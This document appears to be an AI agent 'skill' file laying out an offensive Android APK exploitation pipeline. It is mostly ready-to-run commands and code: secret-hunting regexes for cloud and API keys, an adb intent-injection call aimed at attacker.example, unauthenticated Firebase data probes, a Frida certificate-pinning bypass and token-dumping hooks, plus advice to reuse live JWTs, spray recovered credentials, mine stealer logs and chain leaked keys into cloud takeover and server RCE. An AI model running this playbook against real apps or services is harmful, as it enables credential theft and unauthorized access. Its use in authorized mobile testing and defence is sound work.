---
name: Android APK Exploitation
description: End-to-end Android APK offensive workflow — acquisition, jadx decompilation, high-signal secret/JWT/Firebase grep, pinned-cert extraction, exported-component intent abuse, and Frida/objection runtime instrumentation.
tags: [mobile, android, apk, reverse-engineering, secrets, frida]
recommended_tools: [execute_command, jadx, apktool, curl, python3, jq, frida, objection, mitmproxy, trufflehog, gitleaks, jwt_analyzer]
vuln_classes: []
domain: mobile
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/apk-redteam-pipeline/SKILL.md]}
---

# Android APK Exploitation

Static-to-dynamic pipeline for extracting attack surface and secrets from Android
apps: inventory org-owned packages, acquire APKs, decompile, grep for high-signal
secrets, inspect Firebase/cloud config, enumerate exported components, then move to
runtime instrumentation (Frida/objection/mitmproxy) when static analysis is exhausted.

## When to use

Trigger when:
- Recon surfaces 1+ mobile apps under the target's developer name (Play Store dev page).
- A web app hosts `*.apk` files directly (e.g. `Recruitz.apk` on a subdomain).
- APK package IDs leak via stealer logs (`com.<brand>.app`, `com.<corp>.<sub-brand>`).
- A customer-facing app, dealer/partner portal, or employee companion app is in scope.
- A bug bounty program lists Android in scope.

Do NOT use for:
- iOS-only targets (different pipeline — IPA reverse, MobSF, `frida-ios-dump`).
- React Native / Flutter web bundles already covered by JS-bundle analysis.
- Server-side-only assessments.

## Stage 0 — Inventory all org-owned apps

### Play Store developer-page scrape
```bash
# Find developer page from the target brand name
curl -sk -A "Mozilla/5.0" "https://play.google.com/store/apps/developer?id=<Brand+Name>" -o dev.html

# Extract package IDs
grep -oE 'id=[a-zA-Z0-9._]+' dev.html | sort -u
```

A multi-brand conglomerate typically ships 5-7+ packages of the shape:
```
com.events.<brand>build
com.<corp>.<sub-brand-1>
com.<corp>.<flagship>
com.<corp>.<product-line-1>
```

### Cross-reference and permute
- Stealer-log format includes package names like `*@com.<corp>.<app>` — pull from any
  leaked `creds_userpass.txt`.
- Brand permutation guesses:
```
com.<brand>.app        com.<brand>.mobile      com.<brand>.android
com.<brand>connect.app in.<brand>.dealer       in.co.<brand>.app
```

## Stage 1 — APK acquisition

```bash
# Primary: APKPure direct (no auth), follow 302 redirects
curl -sk -L --max-time 60 "https://d.apkpure.net/b/APK/<package_id>?version=latest" -o "<package_id>.apk"

# Secondary: APKMirror search
curl -sk -A "Mozilla/5.0" "https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=<brand>" \
  | grep -oE 'href="[^"]+\.apk[^"]*"' | sort -u

# Tertiary: APKPure web search
curl -sk "https://apkpure.com/search?q=<brand>" | grep -oE 'data-dt-app="[^"]+"'
```

### XAPK vs APK
- `.xapk` = a zip of split APKs (`base` + `config.armeabi-v7a` + `config.<lang>` + ...).
  Unzip the outer, then unzip the inner `base.apk` / `<package>.apk`.
- Truncated XAPK with a missing EOCD signature is a symptom of CDN rate-limiting —
  rotate IP and retry, or use `7z x` (more lenient than `unzip`).
```bash
unzip -o <package>.apk -d extracted_<package>/          # clean APK
7z x -y <package>.apk -o"extracted_<package>"           # truncated/repaired XAPK

# Nested XAPK: expand each inner split
for inner in extracted_<package>/*.apk; do
  d="extracted_<package>/$(basename "$inner" .apk)"; mkdir -p "$d"
  unzip -o "$inner" -d "$d"
done
```

## Stage 2 — DEX decompilation (jadx)

```bash
jadx -d decompiled_<package>/ <package>.apk

# XAPK containing multiple APKs
for inner in extracted_<package>/*.apk; do
  jadx -d "decompiled_<package>_$(basename "$inner" .apk)/" "$inner"
done

# Fast strings-only pass (no full decompile)
find extracted_<package> -name "classes*.dex" -exec strings -8 {} \; > strings_<package>.txt
```

## Stage 3 — Secret grep (high-signal catalog)

Prefer specific patterns over generic word grep. Feed the extracted tree to
`trufflehog filesystem extracted_<package>/` or `gitleaks detect --no-git` for
verified-secret coverage, then hand-grep for the app-specific patterns below.

```bash
# Owned-domain URLs
grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2)\.(com|io|net|in)[a-zA-Z0-9./_?=&%-]*' strings_<package>.txt | sort -u

# Internal / RFC1918 URLs
grep -oE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' strings_<package>.txt

# Cloud & service credentials
grep -oE 'AKIA[A-Z0-9]{16}'                             # AWS Access Key ID
grep -oE 'aws_secret_access_key[[:space:]:=]+[A-Za-z0-9/+=]{40}'  # AWS Secret
grep -oE 'AIza[A-Za-z0-9_-]{35}'                        # Google API key
grep -oE 'ya29\.[A-Za-z0-9_-]+'                         # Google OAuth refresh token
grep -oE 'gh[ps]_[A-Za-z0-9]{36}'                       # GitHub PAT
grep -oE 'glpat-[A-Za-z0-9_-]{20}'                      # GitLab PAT
grep -oE 'xox[pbar]-[A-Za-z0-9-]+'                      # Slack token
grep -oE 'sk-ant-[A-Za-z0-9_-]{90,}'                    # Anthropic API key
grep -oE 'AC[a-f0-9]{32}'                               # Twilio Account SID
grep -oE 'sk_live_[A-Za-z0-9]{24}'                      # Stripe live key
grep -oE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'     # SendGrid

# JWT (any algorithm)
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_<package>.txt

# Firebase config keys
grep -oE '"(api_key|project_id|database_url|storage_bucket|client_id|mobilesdk_app_id|google_app_id|gcm_defaultSenderId)"[[:space:]]*:[[:space:]]*"[^"]+"' \
  extracted_<package>/res/values/strings.xml \
  extracted_<package>/google-services.json 2>/dev/null

# OAuth client secrets
grep -oE 'client_secret["[:space:]:=]+[A-Za-z0-9_-]{24,}' strings_<package>.txt
```

### Real-world example (anonymized, authorized engagement)
A customer-facing APK shipped a hardcoded URL:
```
https://api.<client>.example/<path-token>/<resource-token>?token=eyJhbGci...JWT
# Decoded JWT payload: {"sid":<int>,"iat":<ts>,"exp":<ts>} — expired ~8 years earlier.
# Still yielded 30+ /v1/* endpoint paths against an internal-only api2.<client>.example.
```
Expired tokens are not dead intel — path structure, endpoint inventory, and signing
algorithm remain reconnaissance-grade. Decode JWTs with `jwt_analyzer` and note the
`alg`: an HS256 secret recovered later (via SSRF/LFI) yields arbitrary token forging.

## Stage 4 — Pinned certificate extraction

Pinned certs and `network_security_config.xml` reveal internal API hosts that never
surfaced in passive recon (e.g. `assets/api_<service>_<domain>_com.cer`).

```bash
find extracted_<package>/assets -iname "*.cer" -o -iname "*.der" -o -iname "*.pem" -o -iname "*.crt" 2>/dev/null
find extracted_<package> -name "network_security_config.xml" -exec cat {} \;

for cert in $(find extracted_<package>/assets -iname "*.cer"); do
  echo "=== $cert ==="
  openssl x509 -in "$cert" -noout -subject -issuer -dates 2>/dev/null
  openssl x509 -in "$cert" -noout -text 2>/dev/null | grep -E 'Subject:|DNS:|Issuer:|Validity'
done
```

## Stage 5 — Exported component enumeration

Exported components (`android:exported="true"`, or implicit-export via `intent-filter`)
can be triggered by other apps — the primary intent-injection attack surface.

```bash
apktool d <package>.apk -o decoded_<package>/    # decode binary manifest
grep -E '<(activity|service|receiver|provider)' decompiled_<package>/resources/AndroidManifest.xml
grep -E 'android:exported="true"' decompiled_<package>/resources/AndroidManifest.xml
```

For each exported component check whether extras flow into:
- A **WebView** (intent → WebView → XSS / `file://` local-file read).
- A **URI extra** (deep-link → server-side SSRF).
- **Another Activity** (intent redirection / privilege confusion).

Trigger a candidate from adb:
```bash
adb shell am start -n com.target.app/.ExportedActivity \
  --es url "https://attacker.example/poc"
adb shell am broadcast -n com.target.app/.ExportedReceiver --es cmd "test"
```

## Stage 6 — Firebase / cloud-service config

```bash
find extracted_<package> -name "google-services.json" -exec cat {} \; | jq .

# From project_id / storage_bucket / web_api_key, test public exposure:
curl -s "https://firestore.googleapis.com/v1/projects/<project_id>/databases/(default)/documents/users"
curl -s "https://<project_id>.firebaseio.com/.json"                       # Realtime DB
curl -s "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"          # Storage listing
```
Public-read Firestore/RTDB rules and world-listable Storage buckets are extremely
common even in apps that "look simple." Always test.

## Stage 7 — Runtime instrumentation (Frida / objection)

Use a rooted emulator (AVD x86_64, Genymotion) or dedicated test device — never a
production device. Setup:
```bash
pip install --break-system-packages frida-tools objection
adb devices                        # confirm device/emulator
# Push matching frida-server to device and run it as root
```

### Universal cert-pinning bypass
```javascript
// pinning-bypass.js
Java.perform(function () {
  try {  // OkHttp
    var CP = Java.use('okhttp3.CertificatePinner');
    CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {
      console.log('[+] OkHttp pinning bypassed: ' + arguments[0]); return;
    };
  } catch (e) {}
  try {  // Conscrypt / HttpsURLConnection
    var TM = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TM.verifyChain.implementation = function (chain) {
      console.log('[+] TrustManagerImpl.verifyChain bypassed'); return chain;
    };
  } catch (e) {}
});
```
```bash
frida -U -l pinning-bypass.js -f com.target.app --no-pause
```

### Hook HTTP requests / dump tokens
```javascript
Java.perform(function () {
  var Client = Java.use('okhttp3.OkHttpClient');
  Client.newCall.implementation = function (req) {
    console.log('[REQ] ' + req.url().toString());
    console.log('[HDRS] ' + req.headers().toString());
    return this.newCall(req);
  };
});
```
```bash
# Fast method-level introspection with objection
objection --gadget com.target.app explore
# inside: android hooking watch class_method <class>.<method> --dump-args --dump-return
```

## Stage 8 — Traffic capture (mitmproxy)

Once pinning is bypassed, funnel all traffic through mitmproxy for full API discovery.
```bash
mitmproxy --listen-port 8080
# Set device Wi-Fi proxy to <host>:8080; install the mitm CA from http://mitm.it
# (rooted: push to /system/etc/security/cacerts/). Run the Frida pinning bypass
# concurrently so pinned clients still trust the proxy CA.
```

## Decision tree — what to do with what you find

| Finding | Next move |
|---|---|
| Active (non-expired) JWT | Test against the API host; try `sid`/claim manipulation |
| Expired JWT | Harvest path tokens + endpoint structure; note `alg` for later HS256 crack |
| AWS access key (`AKIA*`) | `aws sts get-caller-identity`; enumerate perms — many leaked keys still work |
| Firebase project_id + web_api_key | Test public Firestore / RTDB / Storage read |
| Google API key (`AIza*`) | Probe which API it activates; test against maps/customsearch endpoints |
| Hardcoded `http://` URLs | MITM/downgrade if cert pinning is absent |
| Pinned cert for internal host | New-asset discovery — that host is real |
| Exported Activity + WebView | Intent-injection → URL-loading / `file://` abuse |
| Hardcoded credentials | Spray against related surfaces (respect engagement caps) |

## Chaining notes

- **APK secrets → cloud takeover:** jadx string-grep yields AWS/GCP/Azure creds →
  `aws sts get-caller-identity` → IAM enumeration → privilege-escalation path.
- **APK endpoints → API abuse:** recovered `/v1/*` inventory feeds mass-assignment
  (`{is_admin:true}`), JWT, and CORS probes against the live API.
- **APK HS256 secret → token forging → RCE:** forge admin token → admin API → any
  eval/template sink escalates to server RCE. Exported components with `Runtime.exec`
  sinks provide a local path.
- **APK hostnames → OSINT expansion:** internal hostnames feed certificate-transparency
  lookups to discover sibling subdomains.

## Anti-patterns

- Don't grep only for `password` — high-signal patterns (`AKIA`, `AIza`, `eyJ`) cut noise.
- Don't skip XAPK split APKs — `config.*` splits sometimes carry distinct code paths.
- Don't treat expired JWTs as dead — the endpoint list and signing algorithm persist.
- Don't reverse only the latest version — older APKMirror versions may retain secrets
  removed from newer builds but still valid server-side.
- Don't ignore Firebase in "simple" apps — public-read rules are pervasive.
- Don't run Frida on production devices — rooted emulator / test device only.

## References

- CWE-798 Use of Hard-coded Credentials; CWE-312 Cleartext Storage of Sensitive Info.
- CWE-926 Improper Export of Android Components; CWE-927 Use of Implicit Intent for
  Sensitive Communication.
- CWE-295 Improper Certificate Validation (pinning-bypass / cleartext-fallback classes).
